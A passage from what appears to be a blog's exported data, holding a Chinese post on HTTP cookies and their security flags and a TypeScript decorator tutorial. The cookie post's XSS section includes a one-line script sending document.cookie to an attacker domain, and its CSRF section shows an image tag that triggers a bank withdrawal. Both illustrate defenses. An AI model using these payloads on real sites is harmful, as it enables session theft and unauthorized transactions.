src=”…”></td><td>Y</td><td>N</td><td>N</td></tr></tbody></table><h2 id=\"要点总结：\"><a href=\"#要点总结：\" class=\"headerlink\" title=\"要点总结：\"></a>要点总结：</h2><ul><li><strong>Cookie是服务器保存在本地的数据块</strong></li><li><strong>每次请求都会包含cookie，因此会比较浪费资源</strong></li><li><strong>使用document.cookie可访问非HttpOnly的cookie</strong></li><li><strong>删除本地cookie只能通过给cookie设置过去的Expire删除</strong></li><li><strong>常用鉴别用户身份的方法是给cookie设置签名或token</strong></li><li><strong>为防止XSS、CSRF，应该尽量使用HttpOnly、Secure(https)、SameSite参数及检查referer</strong></li></ul>","site":{"data":{}},"excerpt":"","more":"<p>本文主要介绍了什么是cookie、cookie的特性、cookie的作用及用途、cookie的安全策略。不涉及Cookie的<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies\" target=\"_blank\" rel=\"noopener\">详细参数</a>。</p><h2 id=\"Cookie介绍\"><a href=\"#Cookie介绍\" class=\"headerlink\" title=\"Cookie介绍\"></a>Cookie介绍</h2><p>以下Wikipedia、MDN对cookie的介绍</p><blockquote><p><strong>Wikipedia:</strong></p><p>Cookie（复数形态Cookies），又称为“小甜饼”。类型为“<strong>小型文本文件</strong>”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。由网景公司的前雇员卢·蒙特利在1993年3月发明。最初定义于RFC 2109。当前使用最广泛的 Cookie标准却不是RFC中定义的任何一个，而是在网景公司制定的标准上进行扩展后的产物。</p><p><strong>MDN:</strong></p><p>HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。</p></blockquote><p><strong>划重点：小型文本文件、辨别用户身份存储在用户本地、判断是否来自同一浏览器、保持登录态</strong></p><p>Cookie的最初想法是当作小型文本文件，在HTTP请求中作为用户数据作为信息传递。最常规的用法是服务器给客户端一个唯一标识，客户端在与服务器互动时将标识回传给服务器，客户端即可判断用户登录态。</p><div style=\"width:80%;margin:0 auto;text-align:center\"><img src=\"/http/basic-cookies/exchange-cookies.png\" alt=\"cookies消息传递\">Cookies的传输</div><p><strong>注意</strong>：<em>Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，cookie渐渐被淘汰。</em></p><h2 id=\"Cookie的特性\"><a href=\"#Cookie的特性\" class=\"headerlink\" title=\"Cookie的特性\"></a>Cookie的特性</h2><h3 id=\"前端数据存储及读写\"><a href=\"#前端数据存储及读写\" class=\"headerlink\" title=\"前端数据存储及读写\"></a>前端数据存储及读写</h3><p>Cookie可由前端进行操作，可将数据暂存至cookie中。JavaScript操作cookie<br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie\" target=\"_blank\" rel=\"noopener\">document.cookie</a><br></p><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// document.cookie=newCookie 向Cookie中添加新的Cookie Cookie为key=value形式</span></span><br><span class=\"line\"><span class=\"comment\">// 可设置path，domain，max-age，expires，secure</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 增加cookie</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.cookie = <span class=\"string\">`someCookieName=true; expires=<span class=\"subst\">$&#123;<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>().toGMTString() + <span class=\"number\">1</span>&#125;</span>; path=/`</span></span><br><span class=\"line\"><span class=\"comment\">// 删除cookie 通过设置过去的时间删除cookie</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.cookie = <span class=\"string\">`someCookieName=true; expires=<span class=\"subst\">$&#123;<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>().toGMTString() - <span class=\"number\">1</span>&#125;</span>; path=/`</span></span><br><span class=\"line\"><span class=\"comment\">// 修改cookie</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.cookie = <span class=\"string\">`someCookieName=false; expires=<span class=\"subst\">$&#123;<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>().toGMTString() + <span class=\"number\">1</span>&#125;</span>; path=/`</span></span><br><span class=\"line\"><span class=\"comment\">// 查找cookie</span></span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"string\">\"(?:^|;\\\\s*)\"</span> + <span class=\"built_in\">encodeURIComponent</span>(<span class=\"string\">\"需要查找的cookie\"</span>).replace(<span class=\"regexp\">/[-.+*]/g</span>, <span class=\"string\">\"\\\\$&amp;\"</span>) + <span class=\"string\">\"\\\\s*\\\\=\"</span>)).test(<span class=\"built_in\">document</span>.cookie)</span><br></pre></td></tr></table></figure><p></p><h3 id=\"后端通过http头设置\"><a href=\"#后端通过http头设置\" class=\"headerlink\" title=\"后端通过http头设置\"></a>后端通过http头设置</h3><p>后端可以通过设置cookie来设置传递的cookie。Nodejs操作cookie, Koa设置cookie<a href=\"https://github.com/pillarjs/cookies\" target=\"_blank\" rel=\"noopener\">参数</a><br></p><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 以nodejs为例</span></span><br><span class=\"line\"><span class=\"comment\">// 获取</span></span><br><span class=\"line\">response.getHeader(<span class=\"string\">\"Cookie\"</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设置</span></span><br><span class=\"line\">response.setHeader(<span class=\"string\">\"Cookie\"</span>, [<span class=\"string\">\"name=gdccwxx\"</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 以koa为例</span></span><br><span class=\"line\"><span class=\"comment\">// 获取</span></span><br><span class=\"line\">ctx.cookies.get(name, [options])</span><br><span class=\"line\"><span class=\"comment\">// 设置</span></span><br><span class=\"line\">ctx.cookies.set(name, value, [options])</span><br></pre></td></tr></table></figure><p></p><h3 id=\"请求时通过http头传给后端\"><a href=\"#请求时通过http头传给后端\" class=\"headerlink\" title=\"请求时通过http头传给后端\"></a>请求时通过http头传给后端</h3><p>以Google键入请求为例</p><div style=\"width:80%;margin:0 auto;text-align:center\"><img src=\"/http/basic-cookies/font-transfer-cookie.png\" alt=\"请求Google\">请求通过http头传送给后端</div><h3 id=\"遵守同源策略\"><a href=\"#遵守同源策略\" class=\"headerlink\" title=\"遵守同源策略\"></a>遵守同源策略</h3><p>Domain 和 Path 标识定义了cookie的作用域：即cookie应该发送给哪些URL。<br>Domain 标识指定了哪些主机可以接受cookie。如果不指定，默认为当前文档的主机（<strong>不包含子域名</strong>）。如果指定了Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则Cookie也包含在子域名中（如developer.mozilla.org）。</p><h2 id=\"Cookie作用及用途\"><a href=\"#Cookie作用及用途\" class=\"headerlink\" title=\"Cookie作用及用途\"></a>Cookie作用及用途</h2><h3 id=\"Cookie的作用\"><a href=\"#Cookie的作用\" class=\"headerlink\" title=\"Cookie的作用\"></a>Cookie的作用</h3><p><strong>存储个性化设置</strong><br>即使在相同的Domain下，不同的url可以存储不同区块下的cookie，即到达特定页面下可有页面自己的cookie。</p><div style=\"width:80%;margin:0 auto;text-align:center\"><br><img src=\"/http/basic-cookies/out-path-cookie.png\" alt=\"在主页的cookie\"><br><br><br>在google.com的cookie<br><br><br><img src=\"/http/basic-cookies/in-path-cookie.png\" alt=\"在搜索的cookie\"><br><br><br>在google.com/search的cookie<br><br><br></div><p>正因为cookie的作用域，使得cookie存储有着多样性。</p><p><strong>存储未登陆时用户唯一标识</strong></p><p>在可允许未登陆的网站，例如新浪微博。游客态下所做的事情可与用户态下可进行关联。<br>具体操作：<br>1、向未登陆的用户发送一个唯一的标识。<br>2、保留唯一标识所做的事情。<br>3、用户登录后关联账户及唯一标识所做的事情。</p><p>以新浪微博为例：</p><div style=\"width:80%;margin:0 auto;text-align:center\"><br><img src=\"/http/basic-cookies/unlogin-cookie.png\" alt=\"未登陆状态下的cookie\"><br><br><br>未登录状态下的cookie：login_sid_t表示唯一标识<br></div><p>通过唯一标识与登录态的绑定，可建立游客态与用户态的关联</p><p><strong>存储已经登陆用户的凭证</strong><br>cookie中存储用户的唯一标识及简单token。简单token是通过某种形式与用户唯一标识的加密后得出的结果。后端取到token及用户唯一标识，可以通过检查token判断合法性及是否登陆过期判断用户是否为登录态。</p><p><strong>存储其他业务数据</strong><br>可存储其他业务信息，例如用户生日等</p><h3 id=\"Cookie的用途\"><a href=\"#Cookie的用途\" class=\"headerlink\" title=\"Cookie的用途\"></a>Cookie的用途</h3><p>了解Cookie的作用后，其主要用途是以下三个方面：</p><ul><li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li><li>个性化设置（如用户自定义设置、主题等）</li><li>浏览器行为跟踪（如跟踪分析用户行为等）</li></ul><h2 id=\"Cookie-的安全策略\"><a href=\"#Cookie-的安全策略\" class=\"headerlink\" title=\"Cookie 的安全策略\"></a>Cookie 的安全策略</h2><h3 id=\"Cookie与XSS的关系\"><a href=\"#Cookie与XSS的关系\" class=\"headerlink\" title=\"Cookie与XSS的关系\"></a>Cookie与XSS的关系</h3><p>在http会话劫持情况下，cookie与xss的关系就显得十分亲密了。看一段代码<br></p><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"keyword\">new</span> Image()).src = <span class=\"string\">\"http://www.evil-domain.com/steal-cookie.php?cookie=\"</span> + <span class=\"built_in\">document</span>.cookie;</span><br></pre></td></tr></table></figure><p></p><p>这种情况下的cookie则会发送到攻击者的网站。</p><h4 id=\"分析XSS攻击：\"><a href=\"#分析XSS攻击：\" class=\"headerlink\" title=\"分析XSS攻击：\"></a>分析XSS攻击：</h4><ul><li>会话被劫持</li><li>通过document获取cookie</li></ul><h4 id=\"解决办法：\"><a href=\"#解决办法：\" class=\"headerlink\" title=\"解决办法：\"></a>解决办法：</h4><ul><li>会话劫持：使用cookie中Secure标识</li><li>不被JavaScript调用cookie：使用cookie中HttpOnly标识</li></ul><h4 id=\"参数介绍\"><a href=\"#参数介绍\" class=\"headerlink\" title=\"参数介绍\"></a>参数介绍</h4><p><strong>Secure（目前Chrome、Firefox在52+版本不允许非安全的HTTP设置Cookie）</strong></p><blockquote><p>一个带有安全属性的 cookie 只有在请求使用SSL和HTTPS协议的时候才会被发送到服务器。然而，保密或敏感信息永远不要在 HTTP cookie 中存储或传输，因为整个机制从本质上来说都是不安全的，比如前述协议并不意味着所有的信息都是经过加密的。</p></blockquote><p>用法：</p><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Set</span>-Cookie: name=gdccwxx; secure</span><br></pre></td></tr></table></figure><p><strong>HttpOnly</strong></p><blockquote><p>设置了 HttpOnly 属性的 cookie 不能使用 JavaScript 经由 <code>Document.cookie</code> 属性、<code>XMLHttpRequest</code> 和 <code>Request</code>APIs 进行访问，以防范跨站脚本攻击（XSS）。</p></blockquote><p>用法：</p><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Set</span>-Cookie: name=gdccwxx; HttpOnly</span><br></pre></td></tr></table></figure><h3 id=\"Cookie与CSRF的关系\"><a href=\"#Cookie与CSRF的关系\" class=\"headerlink\" title=\"Cookie与CSRF的关系\"></a>Cookie与CSRF的关系</h3><p>CSRF利用了用户的Cookie，通过第三方请求跨站进行攻击。<br>以下Wikipedia中的一个例子：在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：<br></p><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p></p><p>这种情况会直接在本地load图片，图片地址指向的是银行。若本地打开过该银行相关信息，且cookie有效，则会直接被攻击者的账户提现。</p><h4 id=\"分析CSRF攻击\"><a href=\"#分析CSRF攻击\" class=\"headerlink\" title=\"分析CSRF攻击\"></a>分析CSRF攻击</h4><ul><li>被攻击者本地Cookie信息没有过期</li><li>银行转账系统无二次确认，直接转账</li><li>第三方网站（不安全的聊天室或论坛）加载请求</li><li>攻击者无法读写Cookie</li></ul><h4 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h4><ul><li>敏感信息过期时效缩短：目标网站对敏感Cookie设置较短的过期时间</li><li>增加二次确认：目标网站对敏感操作无二次确认</li><li>不允许第三方网站带cookie访问：检查访问请求referer来源，禁止第三方网站访问。</li><li>允许服务器要求某个cookie在跨站请求时不被发送：使用cookie中SameSite标识</li></ul><h4 id=\"参数介绍-1\"><a href=\"#参数介绍-1\" class=\"headerlink\" title=\"参数介绍\"></a>参数介绍</h4><p><strong>SameSite（目前兼容性不足，但不影响设置不支持该属性的浏览器）</strong></p><blockquote><p>允许服务器设定一则 cookie 不随着跨域请求一起发送，这样可以在一定程度上防范跨站请求伪造攻击（CSRF）。</p></blockquote><p>用法：</p><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Set</span>-Cookie: name=gdccwxx; SameSite <span class=\"comment\">// default SameSite=Strict</span></span><br><span class=\"line\"><span class=\"built_in\">Set</span>-Cookie: name=gdccwxx; SameSite=Lax</span><br></pre></td></tr></table></figure><table><thead><tr><th style=\"text-align:left\"><strong>请求类型</strong></th><th><strong>例子</strong></th><th><strong>非 SameSit</strong></th><th><strong>SameSite = Lax</strong></th><th><strong>SameSite = Strict</strong></th></tr></thead><tbody><tr><td style=\"text-align:left\">link</td><td>&lt;a href=”…”></td><td>Y</td><td>Y</td><td>N</td></tr><tr><td style=\"text-align:left\">prerender</td><td>\\&lt;link rel=”prerender” href=”…”></td><td>Y</td><td>Y</td><td>N</td></tr><tr><td style=\"text-align:left\">form get</td><td>&lt;form method=”get” action=”…”></td><td>Y</td><td>Y</td><td>N</td></tr><tr><td style=\"text-align:left\">form post</td><td>&lt;form method=”post” action=”…”></td><td>Y</td><td>N</td><td>N</td></tr><tr><td style=\"text-align:left\">iframe</td><td>&lt;iframe src=”…”></td><td>Y</td><td>N</td><td>N</td></tr><tr><td style=\"text-align:left\">ajax</td><td>$.get(‘…’)</td><td>Y</td><td>N</td><td>N</td></tr><tr><td style=\"text-align:left\">image</td><td>&lt;img src=”…”></td><td>Y</td><td>N</td><td>N</td></tr></tbody></table><h2 id=\"要点总结：\"><a href=\"#要点总结：\" class=\"headerlink\" title=\"要点总结：\"></a>要点总结：</h2><ul><li><strong>Cookie是服务器保存在本地的数据块</strong></li><li><strong>每次请求都会包含cookie，因此会比较浪费资源</strong></li><li><strong>使用document.cookie可访问非HttpOnly的cookie</strong></li><li><strong>删除本地cookie只能通过给cookie设置过去的Expire删除</strong></li><li><strong>常用鉴别用户身份的方法是给cookie设置签名或token</strong></li><li><strong>为防止XSS、CSRF，应该尽量使用HttpOnly、Secure(https)、SameSite参数及检查referer</strong></li></ul>"},{"title":"Decorator 最佳实践","date":"2021-09-05T12:22:01.000Z","dir":"typescript","keywords":["typescript","javascript","decorator","装饰器"],"_content":"## 前言\n很多语言和方法都有 AOP 编程。AOP 的好处是只需要写一次函数检查，在函数调用前只做引用即可。极大的减少了重复代码的编写。\n\n试想一下：在函数入参检查类型时需要反复用 `typeof parameter === '类型'` 来做检查时一件非常痛苦的事情。虽然用了 `Typescript`，但只是解决了编码时候的类型校验，而运行时的校验依旧需要编码来做检查。\n\n本篇介绍的 `Decorator` 用法，就是为了解决这一困扰而出现的。它不仅一行代码解决了运行时的入参类型检查；还能用一行代码做函数权限检查，只让有权限的人调用；更能一行代码解决入参和结果的日志打印。让代码更容易维护的同时，也更专注于业务的实现。\n\n如果您对例子感兴趣，可以直接到[使用举例](#使用举例)\n\n\n### 啥是 Decorator?\nDecorator 是 ES6 中的提案之一，它实际上是个 wrapper，可以为类、属性或函数提供额外功能。举个🌰：\n```ts\nfunction f(key: string): any {\n  console.log(\"evaluate: \", key);\n  return function () {\n    console.log(\"call: \", key);\n  };\n}\n\n@f(\"Class Decorator\")\nclass A {\n  constructor(@f(\"Constructor Parameter\") foo) {}\n\n  @f(\"Instance Method\") // 1\n  method(@f(\"Instance Method Parameter\") foo) {} // 2\n\n  @f(\"Instance Property\")\n  prop?: number;\n}\n\n// 基本上，装饰器会的行为就是下面这样：\n\n@f()\nclass A\n\n// 等同于\nA = f(A) || A\n```\n\n## 使用前的准备\n虽然 Decorator 只是一个提案，但可通过工具来使用它：\n\n### Babel:\n> babel-plugin-syntax-decorators\n> babel-plugin-transform-decorators-legacy\n\n### Typescript:\n命令行：\n```bash\ntsc --target ES5 --experimentalDecorators\n```\ntsconfig.json:\n```json\n{\n  \"compilerOptions\": {\n    \"target\": \"ES5\",\n    \"experimentalDecorators\": true\n  }\n}\n```\n\n\n\n## 定义\n![decorators](xmind.png)\n### 类装饰器\n📌 参数：\n- `target`: 类的 `构造器（constructor）`\n\n⬅️ 返回值: undefined | 替代原有构造器\n\n因此，类装饰器适合用于继承一个现有类并添加一些属性和方法。\n```ts\nfunction rewirteClassConstructor<T extends { new (...args: any[]): {} }>(constructor: T) {\n  return class extends constructor {\n    words = \"rewrite constructor\";\n  };\n}\n \n@rewirteClassConstructor\nclass Speak {\n  words: string;\n \n  constructor(t: string) {\n    this.words = t;\n  }\n}\n \nconst say = new Speak(\"hello world\");\nconsole.log(say.words) // rewrite constructor\n```\n\n### 属性装饰器\n\n📌 参数: \n- `target`: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链\n- `propertyKey`: 属性名称\n\n⬅️ 返回值: 返回的结果将被忽略\n\n除了用于收集信息外，属性装饰器也可以用来给类添加额外的方法和属性。 例如我们可以写一个装饰器来给某些属性添加监听器。\n```ts\nimport \"reflect-metadata\";\n\nfunction capitalizeFirstLetter(str: string) {\n  return str.charAt(0).toUpperCase() + str.slice(1);\n}\n\nfunction observable(target: any, key: string): any {\n  // prop -> onPropChange\n  const targetKey = \"on\" + capitalizeFirstLetter(key) + \"Change\";\n\n  target[targetKey] = function (fn: (prev: any, next: any) => void) {\n      let prev = this[key];\n      // tsconfig.json target to ES6\n      Reflect.defineProperty(this, key, {\n        set(next) {\n          fn(prev, next);\n          prev = next;\n        }\n      })\n    };\n}\n\nclass C {\n  \n  @observable\n  foo = -1;\n\n  onFooChange(arg0: (prev: any, next: any) => void) {}\n}\n\nconst c = new C();\n\nc.onFooChange((prev, next) => console.log(`prev: ${prev}, next: ${next}`))\n\nc.foo = 100; // -> prev: -1, next: 100\nc.foo = -3.14; // -> prev: 100, next: -3.14\n```\n\n\n### 方法装饰器\n📌 参数：\n- `target`: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链\n- `propertyKey`: 属性名称\n- `descriptor`: 属性的 [描述器](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor)\n\n⬅️ 返回值：undefined | 替代属性的描述器。\n\n方法装饰器`descriptor`的key为：\n```\nvalue\nwritable\nenumerable\nconfigurable\n```\n\n通过这个参数我们可以修改方法原本的实现，添加一些共用逻辑。 例如我们可以给一些方法添加打印输入与输出的能力:\n```ts\nfunction logger(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\n  const original = descriptor.value;\n\n  descriptor.value = function (...args) {\n    console.log('params: ', ...args);\n    const result = original.call(this, ...args);\n    console.log('result: ', result);\n    return result;\n  }\n}\n\nclass C {\n  @logger\n  add(x: number, y:number ) {\n    return x + y;\n  }\n}\n\nconst c = new C();\nc.add(1, 2);\n// -> params: 1, 2\n// -> result: 3\n```\n\n### 访问器装饰器\n📌 参数：\n- `target`: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链\n- `propertyKey`: 属性名称\n- `descriptor`: 属性的 [描述器](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor)\n\n⬅️ 返回值：undefined | 替代属性的描述器。\n\n\n访问器装饰器`descriptor`的key为：\n```\nget\nset\nenumerable\nconfigurable\n```\n\n访问器装饰器总体上讲和方法装饰器很接近，唯一的区别在于描述器中有的key不同例如，我们可以将某个属性设为不可变值：\n```ts\nfunction immutable(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\n  const original = descriptor.set;\n\n  descriptor.set = function (value: any) {\n    return original.call(this, { ...value })\n  }\n}\n\nclass C {\n  private _point = { x: 0, y: 0 }\n\n  @immutable\n  set point(value: { x: number, y: number }) {\n    this._point = value;\n  }\n\n  get point() {\n    return this._point;\n  }\n}\n\nconst c = new C();\nconst point = { x: 1, y: 1 }\nc.point = point;\n\nconsole.log(c.point === point)\n// -> false\n```\n\n### 参数装饰器\n📌 参数：\n- `target`: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链\n- `propertyKey`: 属性的名称(注意是方法的名称，而不是参数的名称)\n- `paramerterIndex`: 参数在方法中所处的位置的下标\n\n⬅️ 返回值：返回的值将会被忽略。\n\n单独的参数装饰器能做的事情很有限，它一般都被用于记录可被其它装饰器使用的信息。\n```ts\n// parameter.ts\nimport \"reflect-metadata\";\n\nfunction required(target: Object, propertyKey: string | symbol, parameterIndex: number) {\n    let existingRequiredParameters: number[] = Reflect.getOwnMetadata('required', target, propertyKey) || [];\n    existingRequiredParameters.push(parameterIndex);\n    Reflect.defineMetadata('required', existingRequiredParameters, target, propertyKey);\n}\n\nfunction validate(target: any, propertyName: string, descriptor: TypedPropertyDescriptor<Function>) {\n    let method = descriptor.value!;\n   \n    descriptor.value = function () {\n      let requiredParameters: number[] = Reflect.getOwnMetadata('required', target, propertyName);\n      if (requiredParameters) {\n        for (let parameterIndex of requiredParameters) {\n          if (parameterIndex >= arguments.length || arguments[parameterIndex] === undefined) {\n            throw new Error(\"Missing required argument.\");\n          }\n        }\n      }\n      return method.apply(this, arguments);\n    };\n  }\n\nclass BugReport {\n    type = \"report\";\n    title: string;\n   \n    constructor(t: string) {\n      this.title = t;\n    }\n   \n    @validate\n    print(@required verbose: boolean) {\n      if (verbose) {\n        return `type: ${this.type}\\ntitle: ${this.title}`;\n      } else {\n       return this.title; \n      }\n    }\n  }\n\nexport const report = new BugReport('mode error');\n```\n\n```js\n// test.js\n\nconst { report } = require('./paramerter.js');\nconsole.log(report.print()); // Error: Missing required argument.\n```\n\n## 执行顺序\n不同类型的装饰器执行顺序是明确的：\n1、 实例成员：参数装饰器 -> 方法/访问器/属性 装饰器\n2、 静态成员：参数装饰器 -> 方法/访问器/属性 装饰器\n3、 构造函数：参数装饰器\n4、 类装饰器\n例如：\n\n```ts\nfunction f(key: string): any {\n  console.log(\"evaluate: \", key);\n  return function () {\n    console.log(\"call: \", key);\n  };\n}\n\n@f(\"Class Decorator\")\nclass A {\n  @f(\"Static Property\")\n  static prop?: number;\n\n  @f(\"Static Method\")\n  static method(@f(\"Static Method Parameter\") foo) {}\n\n  constructor(@f(\"Constructor Parameter\") foo) {}\n\n  @f(\"Instance Method\")\n  method(@f(\"Instance Method Parameter\") foo) {}\n\n  @f(\"Instance Property\")\n  prop?: number;\n}\n\n// 执行顺序\nevaluate:  Instance Method\nevaluate:  Instance Method Parameter\ncall:  Instance Method Parameter\ncall:  Instance Method\nevaluate:  Instance Property\ncall:  Instance Property\nevaluate:  Static Property\ncall:  Static Property\nevaluate:  Static Method\nevaluate:  Static Method Parameter\ncall:  Static Method Parameter\ncall:  Static Method\nevaluate:  Class Decorator\nevaluate:  Constructor Parameter\ncall:  Constructor Parameter\ncall:  Class Decorator\n```\n\n然而，在同一方法中的不同参数构造器顺序是相反的，最后参数回的装饰器会先被执行：\n```ts\n\nfunction f(key: string): any {\n  console.log(\"evaluate: \", key);\n  return function () {\n    console.log(\"call: \", key);\n  };\n}\n\nclass B {\n  @f('first')\n  @f('second')\n  method() {}\n}\n\n// 执行顺序\nevaluate:  first\nevaluate:  second\ncall:  second\ncall:  first\n```\n\n\n## 使用场景\n- Before/After钩子。\n- 监听属性改变或者方法调用。\n- 对方法的参数做转换。\n- 添加额外的方法和属性。\n- 运行时类型检查。\n- 自动编解码。\n- 依赖注入。\n\n### 使用举例\n- 日志打印\n```ts\nfunction f(): any {\n  return function (target, key, descriptor) {\n    let method = descriptor.value;\n    descriptor.value = function () {\n      console.log('param: ', Array.from(arguments));\n      const value = method.apply(this, arguments);\n      console.log('result: ', value);\n      return value\n    };\n  };\n}\n\nclass B {\n  @f()\n  say(name: string) {\n      return `name is ${name}`;\n  }\n}\n```\n- 鉴权:\n```ts\nfunction auth(user) {\n  return function(target, key, descriptor) {\n    var originalMethod = descriptor.value; // 保留原有函数\n    if (!user.isAuth) {\n      descriptor.value = function() { // 未登录将返回提示\n        console.log('当前未登录，请登录!');\n      }\n    } else {\n      descriptor.value = function (...args) { // 已登录将原有函数\n        originalMethod.apply(this, args);\n      }\n    }\n    return descriptor;\n  }\n}\n\n@auth(app.user)\nfunction handleStar(new) {\n  new.like++;\n}\n```\n\n- 类型检查\n```ts\nimport \"reflect-metadata\";\nconst stringMetaDataTag = \"IsString\";\n \nfunction IsString(target: Object, propertyKey: string | symbol, parameterIndex: number) {\n  let existingRequiredParameters: number[] = Reflect.getOwnMetadata(stringMetaDataTag, target, propertyKey) || [];\n  existingRequiredParameters.push(parameterIndex);\n  Reflect.defineMetadata( stringMetaDataTag, existingRequiredParameters, target, propertyKey);\n}\n \nfunction validate(target: any, propertyName: string, descriptor: TypedPropertyDescriptor<Function>) {\n  let method = descriptor.value!;\n \n  descriptor.value = function () {\n    let stringMetaTags: number[] = Reflect.getOwnMetadata(stringMetaDataTag, target, propertyName);\n    if (stringMetaTags) {\n      for (let parameterIndex of stringMetaTags) {\n        const value = arguments[parameterIndex];\n        if (!(value instanceof String || typeof value === 'string')) {\n            throw new Error('not string');\n        }\n      }\n    }\n    return method.apply(this, arguments);\n  };\n}\n\n\nexport class A {\n    a: string = '123';\n    \n    @validate\n    value (@IsString value: string) {\n        console.log(value);\n        this.a = value;\n    }\n}\n```\n\n## 写在最后\n\b笔者在 后台接口、Js Bridge、React 项目上都有实践过。不得不说，装饰器模式在面向切面编程(AOP)几乎是 “最佳实践”，极大的提升了编程效率。也希望这篇文章能帮助到你😊\n\n\n### npm 包\n[class-validator](https://github.com/typestack/class-validator)\n[core-decorators](https://github.com/jayphelps/core-decorators)\n[Nest 后台框架](https://github.com/nestjs/nest)\n\n### 参考链接\n[tc39-proposal](https://github.com/tc39/proposal-decorators)\n[typescript](https://www.typescriptlang.org/docs/handbook/decorators.html)\n[a-complete-guide-to-typescript-decorator](https://saul-mirone.github.io/a-complete-guide-to-typescript-decorator/)\n\n","source":"_posts/best-practice-of-decorator.md","raw":"---\ntitle: Decorator 最佳实践\ndate: 2021-09-05 20:22:01\ntags: typescript\ndir: typescript\nkeywords:\n  - typescript\n  - javascript\n  - decorator\n  - 装饰器\n---\n## 前言\n很多语言和方法都有 AOP 编程。AOP 的好处是只需要写一次函数检查，在函数调用前只做引用即可。极大的减少了重复代码的编写。\n\n试想一下：在函数入参检查类型时需要反复用 `typeof parameter === '类型'` 来做检查时一件非常痛苦的事情。虽然用了 `Typescript`，但只是解决了编码时候的类型校验，而运行时的校验依旧需要编码来做检查。\n\n本篇介绍的 `Decorator` 用法，就是为了解决这一困扰而出现的。它不仅一行代码解决了运行时的入参类型检查；还能用一行代码做函数权限检查，只让有权限的人调用；更能一行代码解决入参和结果的日志打印。让代码更容易维护的同时，也更专注于业务的实现。\n\n如果您对例子感兴趣，可以直接到[使用举例](#使用举例)\n\n\n### 啥是 Decorator?\nDecorator 是 ES6 中的提案之一，它实际上是个 wrapper，可以为类、属性或函数提供额外功能。举个🌰：\n```ts\nfunction f(key: string): any {\n  console.log(\"evaluate: \", key);\n  return function () {\n    console.log(\"call: \", key);\n  };\n}\n\n@f(\"Class Decorator\")\nclass A {\n  constructor(@f(\"Constructor Parameter\") foo) {}\n\n  @f(\"Instance Method\") // 1\n  method(@f(\"Instance Method Parameter\") foo) {} // 2\n\n  @f(\"Instance Property\")\n  prop?: number;\n}\n\n// 基本上，装饰器会的行为就是下面这样：\n\n@f()\nclass A\n\n// 等同于\nA = f(A) || A\n```\n\n## 使用前的准备\n虽然 Decorator 只是一个提案，但可通过工具来使用它：\n\n### Babel:\n> babel-plugin-syntax-decorators\n> babel-plugin-transform-decorators-legacy\n\n### 